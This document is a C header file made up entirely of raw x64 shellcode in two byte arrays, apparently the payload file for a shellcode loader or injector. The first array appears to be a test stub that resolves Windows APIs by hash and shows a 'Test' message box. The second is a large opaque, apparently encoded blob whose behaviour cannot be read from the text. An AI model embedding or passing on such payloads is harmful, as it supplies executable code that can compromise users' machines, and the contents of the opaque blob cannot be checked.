#ifndef PAYLOAD_H
#define PAYLOAD_H

static BYTE shellc_hello[295] = {
	0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xCC, 0x00, 0x00,
	0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65,
	0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20,
	0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9,
	0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1,
	0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x48, 0x8B, 0x52, 0x20,
	0x41, 0x51, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18,
	0x0B, 0x02, 0x0F, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8B, 0x80, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x44, 0x8B,
	0x40, 0x20, 0x8B, 0x48, 0x18, 0x50, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48,
	0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9,
	0x48, 0x31, 0xC0, 0x41, 0xC1, 0xC9, 0x0D, 0xAC, 0x41, 0x01, 0xC1, 0x38,
	0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75,
	0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B,
	0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04,
	0x88, 0x41, 0x58, 0x41, 0x58, 0x48, 0x01, 0xD0, 0x5E, 0x59, 0x5A, 0x41,
	0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF,
	0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4B, 0xFF, 0xFF,
	0xFF, 0x5D, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33,
	0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x59, 0x41, 0xBA, 0x4C, 0x77, 0x26,
	0x07, 0xFF, 0xD5, 0x49, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x05,
	0x00, 0x00, 0x00, 0x54, 0x65, 0x73, 0x74, 0x00, 0x5A, 0xE8, 0x05, 0x00,
	0x00, 0x00, 0x54, 0x65, 0x73, 0x74, 0x00, 0x41, 0x58, 0x48, 0x31, 0xC9,
	0x41, 0xBA, 0x45, 0x83, 0x56, 0x07, 0xFF, 0xD5, 0x48, 0x31, 0xC9, 0x41,
	0xBA, 0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5
};

unsigned char buf[] =
"\xe8\xc0\x41\x00\x00\xc0\x41\x00\x00\x48\x94\xf1\xb6\x4f\x28\x20"
"\xc2\x7f\xaa\x43\x66\xa1\x84\xa4\x37\x79\x5d\x30\xa0\x05\xff\x78"
"\x9d\x1f\x2a\xdd\xb9\xc0\x05\x7c\xfe\x00\x00\x00\x00\x67\xb4\x4c"
"\x3d\xb1\xe0\x88\xd2\x0f\xe0\x47\x32\xe8\x20\x61\x5d\xfb\xaa\xe3"
"\xbd\x9b\xdf\xca\xc7\x60\xd5\xe4\x1b\xeb\xae\xc0\x2e\xdc\x97\x4c"
"\xa8\x35\x7d\xbe\x36\xf9\x82\xa3\x3e\x81\xa6\xb7\x74\x5c\xee\x5f"
"\x75\x05\xc9\x01\x1a\x5b\x54\x92\xe2\x83\x3a\xe2\x2a\x17\x49\xa5"
"\x17\x86\xcf\x93\x56\xa6\xae\x78\x77\x85\x52\x5c\xb4\x71\x7b\xc5"
"\xe1\x1b\x55\x4c\x2f\x61\x90\x8d\xbb\xeb\xe3\x30\xaa\xca\x17\xfa"
"\x55\x07\xed\x83\x04\xf4\x42\x11\xb3\x87\x78\xe4\x2f\x24\x8f\x39"
"\x3a\x0a\xaf\x80\x3c\xd9\x9e\x78\x36\xd0\x96\x85\x2f\xb0\xb4\xf4"
"\x1d\xe4\xc1\x41\x2e\x9e\x13\xcf\x05\xd6\xc3\x8f\x4d\x3e\x75\xfb"
"\x56\x4b\x68\x0f\x17\x86\xe5\x28\x8a\x07\xee\xb0\xb2\xfb\x2c\xc7"
"\x02\x9a\xe0\x29\x4d\xa2\x47\xf8\x26\x5a\x4f\x91\xae\x32\xbf\x46"
"\xd0\xd0\x4e\x2c\xef\x9e\xad\x48\x69\x72\x13\xd8\x35\x92\x08\xd4"
"\x89\x7f\xb8\x53\x23\xd8\xba\x4c\xaf\x6d\x08\xe0\x31\xf0\x0a\x43"
"\xd9\xad\xf3\xb6\x0e\xc8\x9c\xc4\xcc\x41\x5d\x0f\x46\xdf\x33\x85"
"\xc0\x76\x0d\xfe\xe3\x63\x07\x1b\xb0\xe2\xea\x89\xb6\x0d\x95\x3e"
"\x92\x72\x02\x6d\xbd\x8f\x3c\xbd\x56\x09\xca\x78\x85\x63\xce\xc0"
"\x09\x97\xde\xb3\x0e\x60\x3f\x7f\x98\x62\x4e\x17\xa2\xba\x18\x89"
"\x84\xc4\xa2\x86\xbf\x27\x3b\xfe\xb5\x98\x96\x96\xe2\xbc\x39\x38"
"\x7a\xeb\x12\x50\xdf\x27\x3d\xa9\x75\x55\x20\x01\xb7\x9f\x01\x3f"
"\x8d\xf4\x74\xdc\xb6\x80\xe6\x66\x15\x8f\x8c\x2f\xee\x2f\x58\x64"
"\x22\x9f\x01\x85\x78\x9f\x8b\x75\xe2\xd1\x24\xa1\x51\x89\x74\x93"
"\x5e\x0a\x9a\x1c\xab\xec\xfa\x6f\x25\x35\xc5\xe7\x5b\x0c\xfe\x80"
"\x8b\x58\xd3\x42\x8e\xce\x69\x8c\x77\xdb\x93\x6b\x30\xe3\x63\x4d"
"\x53\x40\x87\xa1\xb2\x13\xb6\x2e\x13\x90\xde\x42\x16\xaf\x04\xf8"
"\xd4\x93\xb4\xa0\x0c\x07\x19\x72\xe5\xe3\x0e\xf6\x19\xfa\x3b\x10"
"\x94\xda\x78\xb1\x4a\xf9\xbf\xf2\x38\x0d\x0a\x38\x2a\x30\x99\x92"
"\xa9\x5f\xa3\xe4\x3b\x37\x76\x23\x46\xa1\xf7\xab\x9e\x9a\x39\x45"
"\x10\xa0\x22\x6f\xbc\x21\xcc\xd4\x4f\x0c\x63\x16\x7e\x00\x23\x19"
"\xf7\xbd\x33\xc2\xbf\x78\x1f\x89\x08\x4e\x11\xc0\x10\x2b\x13\x8b"
"\x7a\x71\x42\x5c\x59\x70\xa5\x6b\x06\x37\xcd\x1d\xb6\xdc\xb0\xf3"
"\x02\x7b\xa4\x3a\xe6\xb4\xba\xba\xf9\xd2\xd6\x8b\x0f\x27\x5f\xf5"
"\x1e\x02\xef\x65\xad\x24\xc5\xde\x86\x81\x43\x66\x6a\x00\x00\x00"
"\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00"
"\x00\xeb\x9c\x1a\x81\x03\xb1\x17\x3f\x2a\x31\x81\x55\x8e\xa6\xdc"
"\xb1\xd1\x91\x88\xea\x75\x8f\x2e\x81\x9f\x7a\xe1\x28\xa7\xd7\x9d"
"\xe4\x2f\xcc\x3e\xd5\x43\x7a\x04\x8b\x80\xe9\xaa\xda\x2d\x21\xdd"
"\xeb\x50\x23\x42\x98\x7a\xad\x30\xa3\x37\xf6\xdc\xf9\xab\xdb\x55"
"\x58\xfc\x89\x9f\x0f\x14\x79\x65\x9f\x33\x4d\xa5\x1b\xdd\xc3\xb9"
"\x00\x06\x8e\x59\x86\x9b\x87\xbb\x6b\x7b\x96\x7d\x9c\xed\xb8\xbc"
"\x2d\x31\x2d\xfa\x08\xad\xba\xa0\xe0\x9f\x11\x9f\x8c\x52\x1c\xd3"
"\xd2\x8a\xf3\x78\x7f\xa0\xce\x84\xee\x4e\x51\x3f\xe6\xbb\xa4\xd4"
"\x6d\xbc\xb7\x34\xa6\x16\x6f\x50\x02\x9f\x7e\xf8\x46\xa9\x53\x53"
"\x13\xda\x01\x8b\x1c\x91\xb6\xcb\x19\xdb\xfa\xbd\xc4\x68\xc0\x8e"
"\x96\x7a\x4d\x0e\x3a\x68\x19\x17\x12\x0b\x51\x18\x41\x40\xe2\x60"
"\xd8\x59\x69\xaf\x81\x4b\xb5\x9e\xe4\x75\x37\xe3\xd6\x1c\x54\x38"
"\x03\x18\x2e\x8b\xd9\x48\xf8\xf1\xf3\x46\x96\x13\xb5\x46\x40\x6e"
"\xe1\x45\x35\x7c\x54\x83\x9f\xab\x50\x6d\xb7\x76\x75\x01\x56\xa6"
"\x9f\xe5\x97\xea\x0b\x05\x93\xbd\x82\x9f\xae\x09\x83\x62\x4c\x42"
"\xaa\x3b\x45\x72\x23\x2f\x1d\x02\x4f\xa7\xf0\xca\xfc\x2e\x6a\xf8"
"\xb8\xc5\xc7\x34\x18\xc2\xd4\xc8\x10\xe0\x54\xe6\x2f\xe4\xc2\x9a"
"\xc9\x17\x8f\xee\x20\xbb\x96\xfe\x09\x9d\xfd\xb6\x1e\x79\xe4\xa6"
"\x06\xfd\x22\xf6\x20\x3f\x8b\x1a\xfc\xa0\x4f\xde\x0f\x04\xb4\x6b"
"\x44\x75\xeb\x00\x93\x59\xb2\x81\xbe\x17\x8b\xfe\xcf\xf1\x18\xd1"
"\xa7\x64\x70\x53\x8f\xed\x8e\xd1\x03\x46\x30\xe2\x0c\x1f\x78\xc2"
"\x39\x82\xa7\x12\x64\x17\xf4\x04\xa0\x03\xb7\xc0\x3a\x7e\x79\x25"
"\xd1\x11\x28\xa4\xab\x8d\x25\x07\x5a\x33\x11\x17\xcb\x53\x4d\x5f"
"\xf9\x36\xe5\x2a\x19\x36\xe3\xfe\xb1\xc4\xca\x46\xcc\xa4\x89\xef"
"\xd4\x1d\x6d\x40\x9d\x2f\xa9\xe7\xaa\x35\xff\x6a\x71\x7f\x36\x5d"
"\xcc\x53\x98\x7e\xb0\x33\x74\x35\x1d\xed\xab\xb9\x7c\xc7\xf5\x7c"
"\x6f\xba\xa1\xa5\x6d\xff\xdb\xb9\x59\x69\x5e\x38\x4b\x28\x70\xa6"
"\xaa\xd0\x3f\xe2\x07\x4b\x8a\xce\xe9\xa5\x16\x61\x49\x42\x67\xd3"
"\xd9\x4f\x3f\x48\xf0\x86\x21\xea\x2e\x5c\xbc\xae\x9c\x69\x41\xb0"
"\xb2\x72\xac\x43\xc0\x51\x50\x93\x95\x33\x43\xfa\xd9\x6c\x5a\xe3"
"\x1b\x62\x58\xbe\x51\xc7\xf4\x4e\x53\xb2\xff\xba\x17\x28\xd8\x6a"
"\x04\xd1\xb0\x6b\x53\xa8\x72\x80\x6f\x61\x40\x23\x98\x92\xab\xad"
"\xd5\x8c\x12\x03\xe1\x5b\xd4\x82\x9d\x1e\xb5\x5a\x09\xf2\x1f\x06"
"\x99\x54\x6e\x3a\x04\xcf\xd2\x8e\x55\xaf\x11\xfa\xc5\xc2\x74\x23"
"\x46\xcd\x1d\x6a\x57\xaf\xa7\xbc\x45\x5e\x90\x21\x84\xdd\x4a\x56"
"\xeb\x85\x1b\x13\x17\x15\x9c\x82\x36\x53\x52\xea\x92\x6f\x63\x93"
"\x62\xa6\xdd\x06\xc9\xb4\xb3\x3d\xe6\x3d\xd2\x60\x55\xcb\x47\xac"
"\xbe\x64\x4a\x5a\x79\x1d\xc8\xf0\x85\xd7\x68\xfd\xbe\x1d\x67\xa4"
"\x87\x8d\x75\xb6\x55\x65\x0e\xac\xa7\x9c\xc4\xc6\xfe\x8e\xb1\x24"
"\x5c\xcc\xfb\x29\xb1\x65\xbb\x42\x2d\x16\xa9\x1a\x43\x62\x51\x66"
"\x7a\xc9\xf4\x7c\x06\xbb\x23\xc2\x2b\xc0\x7f\xea\xb1\x36\xa4\xf0"
"\x5b\x28\xe5\xff\xd9\x27\x38\x7c\x7b\x01\x34\x4d\x5f\xed\x66\x99"
"\x55\x27\xa8\x83\xd2\xf0\x68\x63\x91\x7a\x23\x34\x36\x4e\x14\xa3"
"\x6b\x62\x11\x43\xc6\xea\xba\xbf\x0f\x7a\x3f\x95\x97\x4f\x82\x2c"
"\x57\x79\x60\xbe\xd6\x2f\x52\x64\xc2\xdb\x0c\x21\x42\x10\xab\xe8"
"\x41\x8f\x81\x3f\x4e\xd9\xa1\xf9\x12\xf3\x29\x3a\x3d\x7f\xcf\x30"
"\x44\x43\x5c\xa1\x8b\x59\x69\x4c\xc1\x9f\x09\x4b\x85\x16\xd5\x39"
"\xc1\xbd\x99\x2d\xd3\xfc\x80\x5f\x35\xfd\x9d\x46\x82\xc3\xc3\x3b"
"\x11\x15\x5f\x5f\xb8\xe6\xe9\x37\xa1\xfc\xcb\xa0\xe4\x1e\x3f\x0c"
"\x3f\x03\xd0\x03\x57\x8e\xce\xd0\xaa\x54\xf1\x37\x1f\xcc\xc3\xf8"
"\x34\x2d\x30\x01\xcc\x68\x5a\x2e\x98\xd6\x59\x43\xb7\x48\xc0\x8a"
"\x47\x33\xe2\xe2\xc4\x28\x03\xfe\x25\x81\x7b\x79\x97\x71\xf1\x77"
"\x3a\x02\xe4\x5a\xb0\x6c\x8d\x86\x0e\xc3\x49\x29\xb2\xd0\x3e\x3f"
"\x11\xd4\xe7\x4a\xd3\x98\x80\x2e\xc1\x96\xa3\xf8\x41\x09\x0b\xd9"
"\x02\x3c\x3b\x20\x32\x60\x0e\x9b\xef\x22\xa0\xdd\x24\x13\x00\x5f"
"\xe3\xc9\x9f\x31\x0e\xdb\xef\x12\xc9\x80\x45\x46\xfd\xa0\xe9\x71"
"\x01\xa8\xf1\x78\xf5\xed\xc8\x87\x62\x71\xba\x5f\x9a\x0d\x28\x8e"
"\xf2\xce\xaf\x98\x12\x5c\xa5\x20\xf1\xb7\x5e\x9e\x20\x19\x7d\x72"
"\x85\x5c\x20\x25\x90\x0b\xb3\x50\xab\x43\x08\xa0\x6a\xfa\x62\x9d"
"\xfb\x95\xbe\xb7\x3a\x17\xda\xd0\x45\xcd\x93\x01\x38\x66\xea\x97"
"\xe1\xac\xad\x60\xfc\x89\xd4\x9b\x62\x2d\xed\xd6\x07\xd4\xec\xe6"
"\x5b\xe2\xf6\x65\x32\x4d\xd9\x80\x01\x65\x03\x91\x34\xc0\x5e\x26"
"\xf4\x8e\xbf\xf6\x28\x67\x39\x54\x9b\x00\x62\x81\xb6\x00\x79\x13"
"\xca\xf7\xa4\x44\xc0\xea\x1f\xca\xcf\x8f\x59\x47\x68\x31\xd8\xb4"
"\xda\xc1\x1f\x91\xb2\x86\x69\xb9\xf6\xaf\xa1\x18\xe2\xe4\x27\x52"
"\x2d\xcd\x6b\x41\x05\x07\x33\x13\x62\x19\x62\x6a\xcc\x6a\xd2\xce"
"\xcd\x7d\xbe\x1d\x0a\x9a\x75\x09\x1d\x66\x21\x85\x26\x97\xc8\xac"
"\x10\xe0\x2a\x32\x6b\xe7\x4c\x8c\xe1\x9a\x02\xc7\xeb\x71\x53\xb5"
"\x12\x25\x0d\x62\xdb\x57\x0c\x82\xfb\xd5\x6c\x82\xfe\x04\x9c\x8d"
"\xc3\xb4\xf5\x6a\xea\xbf\x52\x27\x67\xaf\x21\xb9\xf9\x29\xc2\xb2"
"\x64\x46\x6b\xeb\x98\x88\x46\xa2\x60\x78\x7e\x62\x59\xde\x18\x64"
"\xb8\x71\x92\x28\xda\xf7\xc2\x3f\x2a\x81\x41\x4f\x86\x4a\xac\xd7"
"\x44\x97\xd2\x54\xea\x1b\x1b\x31\xdf\xb0\xca\xa4\xa5\xda\x5b\xf0"
"\x77\x7c\x36\x71\xa0\x95\x0f\x0c\x8f\xfa\x25\x4f\xbf\x55\xde\x48"
"\x3a\x98\xf5\xe6\x94\x59\x57\xf6\x30\xa6\xe1\x08\xc3\x14\xb3\x11"
"\x2d\xf2\xe2\xea\x44\x27\x62\x59\x89\xe1\x7b\x1f\xf5\x78\xb7\x79"
"\xc4\x26\x44\xba\x5a\xab\x76\xa6\x22\x51\x59\x9c\x3b\x36\xf5\x33"
"\x7e\x9b\x0c\x4c\x8e\x21\x4b\xb1\x6a\x71\x79\x01\xe0\x18\x68\xf8"
"\x81\x8c\xd2\x70\x25\xb2\xc4\x89\x20\xfe\x54\xaa\x3d\xad\x70\x11"
"\x52\x4f\x33\xff\xce\xa1\xa7\x47\xb1\x16\x7b\x10\x5b\x87\x92\x49"
"\x66\x0b\x0b\x80\x13\x83\x0c\x1f\x64\xa5\x56\xca\xdf\xfc\x5f\xda"
"\xdb\xf5\x51\x22\x6c\xc4\x64\x25\x1b\x82\x74\xab\x9a\x2f\x19\xbf"
"\xd9\x2a\x28\xd1\x1f\x48\x5a\xb7\xc5\xbf\x16\xd8\xff\x71\x26\x82"
"\xd7\x9b\x9b\xf4\x45\xc4\x38\xc8\x06\xd5\x30\xe8\xa8\x0b\x57\xf7"
"\xce\x0a\x1c\xf6\xda\xdd\x89\x62\x2f\x75\xa8\x07\x2c\x91\xe5\x54"
"\xff\x47\xf7\x54\x6d\x28\xf9\x4e\x44\xc7\xc9\x5b\x38\xa7\xcd\xcf"
"\x08\x1f\x29\xbd\x31\x3e\xac\x11\x00\x82\xb2\x37\x70\x33\xf6\x70"
"\x3e\xea\x9c\xa7\x4e\xc5\xac\x26\xee\x4f\x9b\xa2\x94\xf5\x92\x43"
"\x72\xc7\x2b\xc0\x26\x1e\x41\x09\x1a\x40\x8d\x64\xde\x07\x25\x52"
"\x32\x18\x17\xd6\xa6\xa6\x18\x63\xed\x56\x17\xbe\x4e\x1a\x45\x62"
"\x6d\xb6\x45\xe1\x1b\x77\x9e\xa4\x31\x51\x87\x10\x18\x64\x46\xe0"
"\x47\x26\xf3\xa4\x07\x38\x62\x63\xe5\x78\x82\xa0\xe1\x1f\x04\x80"
"\xbf\xba\x2a\x44\xfd\x15\x96\x61\x37\x65\x94\xa7\xd3\xbd\x09\xcf"
"\x47\x4c\xab\xe5\x88\xd2\xe6\x24\xb2\xcf\x8c\x34\x34\x36\x21\x6e"
"\x9a\xec\xfb\x0b\x5c\x63\xcd\x57\xe9\xe1\xfb\xea\x1d\x6a\x0c\x02"
"\x60\x80\xcd\xfa\x9f\x82\x92\xb7\xbc\x02\xeb\x71\xdb\x08\x4f\x1f"
"\x37\x67\x1f\xe3\xf4\x23\x9b\xf6\x7d\x93\xba\x92\xa5\x3b\x8a\xe8"
"\x39\x9b\x08\xf9\xf7\xc0\x16\x62\xab\xb8\x17\xe6\xc9\x18\x4f\xfc"
"\x0c\xd8\xad\x85\x7c\x37\x69\xad\x6e\x0b\x4a\x45\x0c\xcd\xc0\x36"
"\xca\x0e\xa3\xe4\xae\x2b\x9a\xb4\xb9\x9c\x79\x7d\x91\xa0\x24\x05"
"\xb9\x6a\x8a\x45\xbe\xc2\x1e\x97\x26\x94\xf9\xd7\x0c\x15\x49\xd6"
"\x4d\x64\xe4\x4d\x17\x9c\xfd\xf7\xe1\x3e\xe7\x37\x25\xb7\x8a\xf5"
"\x64\x6b\x90\x5a\x9b\xa4\x35\x11\x36\x17\x12\x61\x97\xa5\xd5\x14"
"\x04\x92\xbe\xe3\x23\x39\x96\x6d\x67\xca\x91\x62\xe1\xff\xba\xcf"
"\x0f\xb1\x2b\x11\xc9\xa7\x7d\x65\xe6\x03\x8c\x3e\x83\x68\xcf\xcc"
"\x8f\x53\xf9\x79\x24\x53\xbe\x38\x94\x03\x98\xb0\xfe\x81\xc5\xd5"
"\xad\x5c\x8f\x2d\xd1\x64\x0e\xfb\x34\xdd\xf8\x53\x55\x06\xbf\x5b"
"\xaf\x64\x78\xba\xa0\xd8\x6d\xab\x43\x4f\x8b\xa3\x23\x1f\x5f\x69"
"\xfe\x82\x65\x17\x47\xd7\xbc\x8d\x7b\xfa\xcb\x33\xb7\x99\x91\xc5"
"\x1a\xc1\x81\x27\x30\x44\x7e\x23\x63\xd4\x53\x5b\x29\x9a\x60\x6b"
"\xe9\xd4\x75\x26\x77\x2c\x05\x98\x72\x6c\xb8\xa6\xaf\xfd\x28\x7f"
"\x2d\x0d\xc2\x06\x93\xf6\xeb\x49\x10\x57\xa8\xc9\x43\xb3\xc8\x13"
"\x6f\x1e\x96\x5c\xe9\x18\x2f\x54\xdb\xbf\x03\x62\xd7\x95\xba\xf8"
"\x7d\xc8\xb6\xfd\xcc\xff\x3a\x9b\x9c\x84\x4c\xd8\x44\x76\xb5\x66"
"\x05\x55\xe9\x12\x38\x0c\x64\xbf\x48\x55\xae\x4a\xa6\x6e\xd4\xbc"
"\xe0\x34\x18\xa8\x90\x66\xd2\x70\x34\xd3\xfe\x50\xd9\x39\x33\xcf"
"\x0c\x84\x87\xb0\x78\x01\xab\xc5\xc4\xec\xa2\x9c\x7d\x8c\x81\xe7"
"\x1a\x4f\x80\x89\xf1\x1b\x40\xb9\x36\xdb\x95\x02\xa6\x8a\x79\xfe"
"\xd9\x1d\x9f\x42\x79\x2a\x5f\x17\xb6\x8f\xee\x1d\x23\x95\x9c\x94"
"\xc4\x98\xc5\x4b\xb7\x43\x3c\xfa\x9b\x88\x30\x3c\xef\x4b\xdd\x1f"
"\x75\xc9\xa2\xcb\xd0\xcb\x2c\x99\x31\x14\x68\xfc\x16\xb2\xb9\x66"
"\x9a\x79\x7f\x47\xb1\x37\xb7\xa2\x37\x05\x78\x6d\x8e\x8d\x31\x41"
"\xad\x47\xe6\x65\xee\xc5\x80\xc3\x8b\x30\x85\x62\xc4\x75\xde\xad"
"\x8b\xe6\xf1\x5e\x3b\x8a\xe3\x7e\x8e\xc3\x7b\x7f\x53\xd3\xe0\xe8"
"\xfa\x77\x0b\x33\x1a\x30\x93\x07\xa7\x07\xdc\xd4\x12\x9e\x8a\x6b"
"\x0c\xad\x09\x40\x8e\x6b\x6e\x1c\xdd\xad\x59\x26\x31\x9c\x22\xc7"
"\x1c\xb5\xba\xd1\x6a\xfb\x69\xc3\x2a\x13\xc9\x8e\x0c\x34\xe8\x4c"
"\xd5\xf6\x03\x7d\xc6\xb3\x0f\xf3\x22\x7a\x0e\x14\xe5\xaa\x11\xe3"
"\x3d\xf8\xb3\xfa\xbb\xc0\x29\xca\x9d\x36\x4e\x15\xa9\x22\x0c\x94"
"\x0f\x26\x73\x18\xf9\x0a\xb4\xc4\xfc\x2b\x6c\x51\x2a\x60\x8c\x92"
"\x71\x70\x71\x5d\xa6\x71\x77\xc6\x2f\x48\xaf\xef\x33\xb5\xde\x9e"
"\xb4\x68\x43\xda\xd4\x48\x6c\x54\x51\x19\xfb\xd5\x4d\xf8\x69\xa5"
"\x33\x20\x4e\x85\x6d\xe3\xd0\x58\x66\x28\x4f\x97\x31\xa2\xf9\xdc"
"\xbd\x4d\xb3\x9f\x20\x96\x9d\x5c\x6e\xda\x81\xa9\x89\x7e\x63\x9e"
"\x50\xa3\x71\xb5\xd4\xd3\x67\x01\x20\xe5\xab\x42\x57\x57\xf3\x53"
"\x0d\x41\xb8\xa3\x68\xe9\x2e\x79\xd2\xf5\x07\xcf\xa1\xb6\x62\x2e"
"\xbc\x43\x05\xfb\x68\x3e\x29\x60\xa4\xb1\x23\xba\xa7\xa1\x0a\xd3"
"\x72\xa9\xb5\xbb\x32\x5f\x77\xaf\x61\x4b\x85\xc7\x9e\xd5\xdd\x8c"
"\x7a\x2f\x75\x82\x0e\x3e\x80\x07\x7f\x00\x98\x58\x51\x33\x99\x19"
"\x0d\xc6\x4b\x65\x6b\x73\x37\xb6\x90\x50\xf9\x6f\x06\x70\x08\x6c"
"\x6d\xe5\x88\x43\xc6\x30\x3b\x28\x76\x52\x3c\xd7\x43\xad\x51\x0e"
"\x1d\x10\x5a\x39\xc2\x5f\xe4\xb3\x43\x8b\x95\x51\x94\x51\x4e\x6e"
"\x4d\x5f\x08\xfb\x30\x27\x15\xa8\x7a\x05\x5f\xb7\x40\x00\x33\x47"
"\xc6\x7e\x4d\x76\xa2\x18\xe6\xc9\x07\xae\x53\xcc\x0d\x99\x51\xee"
"\xb3\x33\x03\x00\x7a\xa4\x31\xcf\xca\xf9\x73\x44\x48\x0f\x66\xa9"
"\x6c\x40\x1c\x6f\x79\x81\x69\x9d\xa2\xc6\x20\x68\x80\x04\x07\x5f"
"\xdc\x6e\xb7\x2b\xc4\x79\x4c\x7e\x52\xa8\x8f\x65\x0a\x8c\x35\x5d"
"\xef\x65\xbc\xae\x84\xf9\x25\x0e\x47\x07\x6e\x4c\xa3\x11\x68\x69"
"\x32\x5c\xf4\x00\xf2\x82\x13\x4e\xf8\x34\x20\xc2\x48\xac\x8e\xd1"
"\x83\x13\xce\xb7\x8b\x02\x38\x31\xdd\x45\xba\x84\x6e\x23\xfc\x6f"
"\xa4\x12\x42\x58\xd4\x70\xc1\xd0\xe1\x6a\xd4\x4a\x25\xb8\xdc\x64"
"\x8b\xfe\x83\x09\x22\xfa\x41\xe0\x03\xae\xf7\x17\xf5\xa2\x87\x8f"
"\x7b\x57\xae\x07\xef\xec\xac\x5a\xf8\x24\xcd\x69\x08\x67\x71\x6d"
"\x28\xa2\x48\x2e\xda\xcd\xc0\xc5\x09\x8d\x8f\xd8\x15\xab\x6d\xa3"
"\xb6\xba\x2f\xce\x8e\x2d\xe2\xa9\xd6\x67\x91\x1f\xcb\xf6\xd1\xf5"
"\xdc\x75\xed\xf9\xc1\xf6\x20\xcc\x0e\x63\x25\xe7\xe3\xc5\x38\x46"
"\x82\xe0\xc8\x34\x02\xc6\x60\x9b\x46\x43\x11\xb4\xd9\xaf\x11\x0c"
"\x55\x87\x15\x9b\x22\x77\x73\x3e\x8a\xbb\x8c\x7b\xfd\x14\x1c\x15"
"\x00\x2b\xa8\xa0\xbe\xa4\x6f\x35\x5d\xe2\xce\x69\x3c\xbc\xe3\xbb"
"\x92\x38\x51\x70\x68\x6d\xd4\x7e\xab\x22\x0b\x2b\xb3\xc2\xb0\x6c"
"\x82\x94\xaa\xf2\xb8\x18\xfe\xdd\x2c\xbf\x50\x96\xc8\xb1\x3a\xad"
"\xfd\xb6\x5e\x1d\xc7\x79\x13\xe3\x67\x6d\x0d\xf4\x50\xa9\xfc\x79"
"\xbd\xdb\xab\xfc\x00\xa5\xad\x41\xeb\x9b\x1e\x88\x92\xdb\xf2\x9e"
"\x94\x00\x8a\xdd\x50\x38\x63\x21\x71\xf8\x7c\x52\x91\x95\x8e\x8b"
"\x6b\x4b\x7c\x00\x73\xe4\x6e\x62\xcb\x27\x12\xee\x67\xc9\x70\x37"
"\xdd\x7e\x0b\xcb\x44\xf6\xa1\xe0\xa8\x99\x6e\xde\x7c\x79\x2d\x03"
"\x9f\x78\xe7\x75\x27\x65\xce\xa9\xb1\xdb\x50\xf5\x1d\x94\xb5\x55"
"\x67\x4f\xce\x3c\xae\x2c\xe3\x4e\x56\xad\x88\x00\x9a\xf8\x99\x08"
"\xf9\x1f\x07\xa7\xd3\x5f\xfc\xae\x5c\x7b\x44\x8d\x6e\x35\xb8\x9e"
"\x04\xea\x8f\x12\x55\xf2\x4b\x37\xb8\x70\xfd\xd3\xeb\x07\xe8\xc9"
"\xa5\x49\x1f\x99\xdf\xab\x63\xeb\x6d\xa6\x3c\xdb\xad\x65\x24\xcb"
"\xa7\x55\xac\x02\x8f\xbc\xdb\x57\x54\xef\x78\x23\xb6\xb6\x2a\x14"
"\xa5\xb5\x1a\xdb\xc6\x30\xba\x5a\x52\xe1\x80\x37\xe9\xe8\xe1\x3f"
"\x83\xc4\xb9\x7a\xb9\x47\xac\xbe\xb3\x96\xdf\xf0\x47\x34\xa3\x5b"
"\x03\x3b\x83\xd5\x3f\xe4\x86\x54\x59\x29\xef\xb0\xc9\x2e\xa6\x9e"
"\xff\x35\x6c\x2c\xdd\x42\x7a\x62\x50\xa3\x3c\xfa\x63\x50\x01\x16"
"\xb2\xbb\x40\xe6\x7d\x58\xa3\x61\x85\x61\x5c\x9f\xe0\x0f\x60\x66"
"\xdb\xce\x61\x7a\x3c\x4a\xb9\x70\xd7\xc7\x33\xb7\xdd\x46\x78\xed"
"\x86\x21\x45\x9b\x9b\x4f\xc2\x0b\x14\x77\x07\x83\x11\x67\x28\x80"
"\x97\xed\x94\xa0\xd6\xcb\xed\x1d\xe9\x40\xa6\x9f\x84\x95\xe2\xe7"
"\xa0\x29\x2b\x2d\x3f\xfe\x79\x5b\x8d\xa3\xe8\x92\xc9\x58\x8a\xc4"
"\x32\xdf\xf8\x01\xe4\x62\xb5\xf7\xd6\xc0\x35\xb8\xcd\x26\x6d\xe0"
"\xcd\x52\x18\x7b\xac\xd6\x13\xaf\xa7\x91\x2e\x55\x4c\x01\xa3\x59"
"\x4f\x7c\xcb\xc5\xba\x63\x4b\x66\xc7\x7a\xa1\xee\x05\xe4\x2a\x78"
"\x4c\xdf\x10\x4f\x5c\x24\x64\x93\x94\xe2\x52\xef\x0e\x0b\x4c\xf5"
"\xcd\x54\xff\x31\x7f\x70\x4d\x85\x44\xa7\x83\xf7\xa9\x4f\xdd\xe3"
"\x5f\x91\x2e\xa4\xf6\x43\xa1\xb8\xcb\x5d\x46\x5b\xd7\x21\x0e\x47"
